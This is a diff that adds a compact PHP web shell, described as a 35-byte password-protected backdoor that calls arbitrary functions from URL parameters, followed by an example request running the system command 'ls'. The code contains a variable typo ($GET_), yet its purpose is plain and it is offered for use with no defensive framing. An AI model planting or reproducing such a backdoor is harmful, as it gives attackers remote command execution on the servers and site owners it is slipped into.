@@ -1,0 +1,6 @@
+
+<?=$_GET[p]==_&&$_GET[f]($GET_[c])
+
+35 bytes PHP backdoor protected by a password, supports arbitrary function calls.
+
+/backdoored.php?p=_&f=system&c=ls
